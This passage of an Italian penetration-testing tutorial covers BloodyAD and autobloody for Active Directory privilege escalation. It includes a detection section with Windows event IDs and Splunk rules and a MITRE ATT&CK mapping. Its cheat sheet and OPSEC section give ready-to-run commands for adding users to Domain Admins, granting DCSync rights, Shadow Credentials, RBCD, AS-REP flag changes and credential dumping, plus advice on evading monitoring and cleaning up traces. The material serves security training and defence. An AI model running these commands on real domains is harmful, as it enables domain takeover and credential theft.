  --neo4j-bolt neo4j://127.0.0.1:7687 \
  --neo4j-user neo4j --neo4j-pass bloodhound \
  --source 'helpdesk' \
  --target 'Administrator'

# autobloody:
# 1. Interroga Neo4j per il percorso più breve helpdesk → Administrator
# 2. Analizza ogni edge (GenericAll, WriteMember, ecc.)
# 3. Esegue BloodyAD per ogni step
# 4. Alla fine hai le credenziali di Administrator
```

autobloody usa la sua istanza BloodHound CE single-user:

```bash
# Setup BloodHound CE single-user (dal repo autobloody)
git clone https://github.com/CravateRouge/Single-User-BloodHound.git
cd Single-User-BloodHound
./bloodhound-ce    # avvia tutto con Docker Compose
```

***

## Il modulo `msldap` — funzioni sperimentali

Oltre a `get`/`set`/`add`/`remove`, BloodyAD espone un quarto gruppo di comandi, `msldap`, che dà accesso diretto a funzioni più basso livello della libreria MSLDAP (quasi 90 sotto-comandi). È marcato **esplicitamente sperimentale** dal progetto — usalo solo se il comando equivalente in `get`/`set`/`add`/`remove` non copre il caso.

```bash
bloodyAD --host DC -d corp -u user -p pass msldap -h
```

Alcuni dei più utili per un pentest:

```bash
# Utenti ASREP-roastable (equivalente rapido a una get search filtrata)
bloodyAD --host DC -d corp -u user -p pass msldap asrep

# SPN kerberoastable
bloodyAD --host DC -d corp -u user -p pass msldap spns

# Delegazione non vincolata / vincolata già configurata nel dominio
bloodyAD --host DC -d corp -u user -p pass msldap unconstrained
bloodyAD --host DC -d corp -u user -p pass msldap constrained

# Verifica rapida se Bad Successor è sfruttabile
bloodyAD --host DC -d corp -u user -p pass msldap badsuccessor_check

# Password LAPS leggibili
bloodyAD --host DC -d corp -u user -p pass msldap laps

# Whoami completo (permessi effettivi, gruppi, SID)
bloodyAD --host DC -d corp -u user -p pass msldap whoami
```

> Il modulo `msldap` duplica in parte funzionalità già coperte da `get`/`add`/`remove` (es. `msldap adduser` vs `add user`) — preferisci sempre i comandi principali quando esiste un equivalente, sono più testati e stabili.

***

## OPSEC

BloodyAD genera traffico LDAP verso il Domain Controller — meno rumoroso di PowerShell o di tool che spawna processi, ma comunque tracciabile.

**Usa LDAPS invece di LDAP.** Le query LDAP in chiaro (porta 389) sono visibili in rete. LDAPS (porta 636) le cifra. Aggiungi `-s` a ogni comando.

```bash
bloodyAD --host DC_IP -d corp -u user -p pass -s get object Administrator
```

**Minimizza le query.** Ogni comando `get writable` genera decine di query LDAP. In ambienti con monitoring avanzato, un burst di query LDAP da un host non-DC è anomalo. Usa `get writable` una volta sola, non in loop.

**Cleanup degli artefatti.** Dopo ogni operazione, rimuovi le tracce:

```bash
# Rimuovi il computer account creato per RBCD
impacket-addcomputer corp.local/admin:pass -dc-ip DC_IP \
  -computer-name 'EVIL01$' -delete

# Rimuovi Shadow Credentials
bloodyAD --host DC_IP -d corp -u attacker -p pass \
  remove shadowCredentials john.doe --key-id KEY_ID

# Rimuovi membership aggiunta
bloodyAD --host DC_IP -d corp -u admin -p pass \
  remove groupMember 'Domain Admins' attacker
```

**Usa pass-the-hash o pass-the-ticket** invece delle credenziali in chiaro quando possibile — riduce l'esposizione delle credenziali nei processi.

**Evita `add dcsync` in ambienti con logging avanzato.** La modifica delle ACL del dominio (WriteDACL) genera Event ID 4662 con modifiche all'oggetto dominio — tra i log AD più monitorati. Se puoi fare DCSync in altro modo (es. via Mimikatz con DA), preferisci quello.

***

## Detection — cosa vede il blue team

BloodyAD è più stealth di molte alternative perché usa LDAP diretto senza PowerShell, ma lascia tracce specifiche nei log AD.

### Event IDs rilevanti

```
4662 — An operation was performed on an object
       → Triggered da ogni modifica LDAP significativa
       → Alert su: modifiche a msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD)
                   modifiche a msDS-KeyCredentialLink (Shadow Creds)
                   aggiunta diritti di replica (WriteDACL → DCSync)

4728 — A member was added to a security-enabled global group
4729 — A member was removed from a security-enabled global group
       → Alert su aggiunte a Domain Admins, Enterprise Admins

4723 — An attempt was made to change an account's password
4724 — An attempt was made to reset an account's password
       → Alert su reset password di account privilegiati

4768 — A Kerberos authentication ticket (TGT) was requested
4769 — A Kerberos service ticket was requested
       → Pattern S4U (RBCD): 4768 + 4769 con RC4 o AES per S4U2proxy
```

### LDAP anomalie

```
🔴 Segnali critici:
- Modifica di msDS-AllowedToActOnBehalfOfOtherIdentity su DC (RBCD)
- Modifica di msDS-KeyCredentialLink su utente/computer (Shadow Creds)
- Aggiunta diritti replica all'oggetto dominio (WriteDACL → DCSync)
- Cambio password di account protetti (adminCount=1) da account non admin

🟡 Segnali medi:
- Burst di query LDAP da host non-DC in breve tempo (get writable)
- Creazione computer account con MachineAccountQuota standard
- Query LDAP che leggono attributi sensibili (msDS-*, nTSecurityDescriptor)
```

### Regola Splunk per RBCD su DC

```spl
index=wineventlog EventCode=4662
| where ObjectType="Computer" AND OperationType="Write"
| where AttributeValue like "%AllowedToActOnBehalfOfOtherIdentity%"
| where SubjectUserName!="SYSTEM" AND SubjectUserName!="*$"
| stats count by SubjectUserName, ObjectName, ComputerName
| where count > 0
```

### Regola per Shadow Credentials

```spl
index=wineventlog EventCode=4662
| where AttributeValue like "%KeyCredentialLink%"
| where SubjectUserName!="SYSTEM"
| stats count by SubjectUserName, ObjectName, ComputerName, _time
```

***

## Confronto con alternative

| Tool             | Linguaggio | Via LDAP  | PTH | PTT      | Cert | SOCKS | GUI |
| ---------------- | ---------- | --------- | --- | -------- | ---- | ----- | --- |
| **BloodyAD**     | Python     | ✅ Diretto | ✅   | ✅        | ✅    | ✅     | ❌   |
| PowerView        | PowerShell | ✅         | ❌   | Parziale | ❌    | ❌     | ❌   |
| impacket-scripts | Python     | Parziale  | ✅   | ✅        | ✅    | ✅     | ❌   |
| certipy          | Python     | Parziale  | ✅   | ✅        | ✅    | ✅     | ❌   |
| ldap3 (raw)      | Python     | ✅         | ❌   | ❌        | ❌    | ❌     | ❌   |
| SharpAD (C#)     | C#         | ✅         | ❌   | ✅        | ✅    | ❌     | ❌   |

**BloodyAD vince su:** completezza di operazioni in un singolo tool, supporto auth completo, integrazione SOCKS, autobloody per automazione.

**PowerView vince su:** integrazione nativa Windows, familiarità, output più ricco per enumerazione.

**impacket vince su:** più tool specializzati per operazioni specifiche (secretsdump, getST, ntlmrelayx).

***

## Quick Reference — comandi per ogni ACE BloodHound

```bash
BASE="bloodyAD --host DC -d corp -u USER -p PASS"

# === ENUMERA ===
$BASE get object TARGET                    # tutti gli attributi
$BASE get writable                         # cosa puoi modificare
$BASE get membership TARGET                # gruppi
$BASE get children 'OU=Users,DC=corp,DC=local'  # contenuto OU
$BASE get trusts                           # mappa trust dominio/foresta
$BASE get dnsDump                          # tutti i record DNS leggibili
$BASE get bloodhound                       # collector BloodHound CE nativo

# === ForceChangePassword ===
$BASE set password TARGET 'NewPass!'

# === GenericAll/GenericWrite su utente ===
$BASE add shadowCredentials TARGET
$BASE set password TARGET 'NewPass!'       # alternativo

# === GenericAll/WriteMember su gruppo ===
$BASE add groupMember 'Domain Admins' MYUSER

# === GenericAll/GenericWrite su computer ===
$BASE add rbcd TARGET$ MYCOMPUTER$

# === WriteDACL su dominio ===
$BASE add dcsync MYUSER                    # poi secretsdump

# === WriteOwner ===
$BASE set owner TARGET MYUSER              # diventa owner → poi modifica ACL

# === RBCD completo ===
# 1. addcomputer
# 2. $BASE add rbcd TARGET$ EVIL$
# 3. getST -impersonate Administrator
# 4. secretsdump con KRB5CCNAME

# === Shadow Credentials completo ===
# 1. $BASE add shadowCredentials TARGET
# 2. certipy auth -pfx TARGET.pfx
# 3. evil-winrm -H NT_HASH

# === Bad Successor (WS2025) ===
$BASE add badSuccessor EVIL_DMSA
# usa ticket generato per secretsdump

# === Oggetti cancellati ===
$BASE get writable --include-del             # trova oggetti tombstoned scrivibili
$BASE set restore TARGET                     # ripristina (sAMAccountName/DN/SID)
$BASE set restore TARGET --newParent 'OU=Users,DC=corp,DC=local'

# === UAC (flag account) ===
$BASE add uac TARGET -f DONT_REQ_PREAUTH     # AS-REP roasting
$BASE add uac TARGET -f TRUSTED_TO_AUTH_FOR_DELEGATION
$BASE remove uac TARGET -f ACCOUNTDISABLE    # riabilita account disabilitato

# === CLEANUP ===
$BASE remove groupMember 'Domain Admins' MYUSER
$BASE remove rbcd TARGET$ EVIL$
$BASE remove shadowCredentials TARGET --key KEY_ID
$BASE remove genericAll TARGET MYUSER
```

***

## MITRE ATT\&CK

| Tattica              | Tecnica       | Come BloodyAD la implementa                                                               |
| -------------------- | ------------- | ----------------------------------------------------------------------------------------- |
| Discovery            | **T1069.002** | Enumerazione gruppi e membership AD                                                       |
| Discovery            | **T1087.002** | Enumerazione account AD (`get object`, `get search`)                                      |
| Credential Access    | **T1003.006** | DCSync via `add dcsync` + impacket-secretsdump                                            |
| Credential Access    | **T1558.003** | SPN per Kerberoasting (`get search` + filter SPN)                                         |
| Privilege Escalation | **T1484.001** | Modifica ACL dominio (`add dcsync`, WriteDACL)                                            |
| Privilege Escalation | **T1098**     | Aggiunta account a gruppi privilegiati                                                    |
| Privilege Escalation | **T1134.001** | Shadow Credentials → PKINIT → token impersonation                                         |
| Lateral Movement     | **T1550.003** | Pass-the-Hash, Pass-the-Ticket per auth                                                   |
| Lateral Movement     | **T1021.002** | SMB post-RBCD via getST                                                                   |
| Defense Evasion      | **T1207**     | RBCD su DC per DCSync senza DCSync diretto                                                |
| Persistence          | **T1098.004** | Shadow Credentials persistenti                                                            |
| Persistence          | **T1098**     | Restore di oggetti cancellati (utenti/gruppi privilegiati, SID History) via `set restore` |

***

## FAQ

**Qual è la differenza tra BloodyAD e PowerView?**
PowerView è PowerShell-only su Windows, ricco per enumerazione. BloodyAD è Python, funziona da Linux, supporta tutti i metodi di auth AD incluso PTH/PTT/cert, e ha autobloody per automazione. BloodyAD è più utile in assessment da Linux o via C2.

**BloodyAD richiede Domain Admin?**
No — richiede solo i permessi necessari per l'operazione specifica. Per `set password` basta `ForceChangePassword` sull'utente target. Per `add groupMember` basta `WriteMember` sul gruppo. Il punto è sfruttare ACE mal configurate con i minimi privilegi.

**Come funziona `-p :HASH` per pass-the-hash?**
Il formato `:HASH` (con due punti prima dell'hash) usa solo la seconda parte (NT hash) del formato `LM:NT` di impacket. Siccome LM non viene mai usato nei sistemi moderni, si omette mettendo solo `:` seguito dall'NT hash a 32 caratteri hex.

**BloodyAD funziona con Kerberos e LDAPS simultaneamente?**
Sì — usa `-k` per Kerberos e `-s` per LDAPS. I due flag si combinano.

**Cos'è il MachineAccountQuota e perché è importante per RBCD?**
Il MachineAccountQuota è un attributo del dominio che specifica quanti computer account ogni utente di dominio può creare. Il default è 10. RBCD spesso richiede di creare un computer account controllato dall'attaccante — se il quota è 0, devi trovare un altro modo (es. usare un computer account già compromesso).

**Bad Successor funziona su tutti i domini Windows Server 2025?**
Richiede che lo schema AD sia stato aggiornato alla versione 91+ (Windows Server 2025). Se l'organizzazione ha già aggiornato lo schema per supportare WS2025, l'attacco è possibile anche su DC che girano ancora WS2022, purché l'attaccante abbia il permesso di creare oggetti in almeno una OU.

**Come ripristino un utente o un oggetto cancellato con BloodyAD?**
Con `set restore TARGET`, dove TARGET può essere sAMAccountName, DN o SID (SID è più sicuro se il nome è duplicato). Serve il permesso "Restore Deleted Objects" o essere owner dell'oggetto tombstoned, più CREATE\_CHILD sulla OU di destinazione. Puoi anche rinominarlo o spostarlo con `--newName` e `--newParent`.

**Qual è la differenza tra oggetto "recycled" e "tombstoned"?**
Con l'AD Recycle Bin attivo, un oggetto cancellato diventa "recycled" e mantiene tutti gli attributi fino a fine tombstone lifetime (default 180 giorni). Senza Recycle Bin (o su DC pre-2008 R2), l'oggetto è solo "tombstoned": perde quasi tutti gli attributi e le membership di gruppo, ma conserva objectSid, nTSecurityDescriptor e sIDHistory — abbastanza per essere comunque abusabile.

***

## Articoli correlati

* [Active Directory — exploitation](https://hackita.it/articoli/active-directory/)
* [BloodHound](https://hackita.it/articoli/bloodhound/) — trova i path che BloodyAD esegue
* [Impacket](https://hackita.it/articoli/impacket/) — getST, secretsdump, addcomputer
* [Mimikatz](https://hackita.it/articoli/mimikatz/) — dump credenziali post-escalation
* [Kerberoasting](https://hackita.it/articoli/kerberoasting/) — exploitation SPN trovati con get search
* [DCSync](https://hackita.it/articoli/dcsync/) — dopo aver ottenuto i diritti di replica
* [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/) — approfondimento PKINIT abuse
* [Rubeus](https://hackita.it/articoli/rubeus/) — operazioni Kerberos post-escalation
* [ntlmrelayx.py](https://hackita.it/articoli/ntlmrelayx/) — relay + RBCD/Shadow Creds
* [PowerShell](https://hackita.it/articoli/powershell/) — alternativa Windows per AD enum

***

## Fonti e riferimenti esterni

* [BloodyAD — GitHub CravateRouge](https://github.com/CravateRouge/bloodyAD)
* [autobloody — GitHub CravateRouge](https://github.com/CravateRouge/autobloody)
* [MITRE ATT\&CK — T1484.001: Domain Policy Modification](https://attack.mitre.org/techniques/T1484/001/)
* [MITRE ATT\&CK — T1098: Account Manipulation](https://attack.mitre.org/techniques/T1098/)

> Uso esclusivo in ambienti autorizzati.

\#bloodyad #active-directory #privilege-escalation #ldap #pentest #red-team
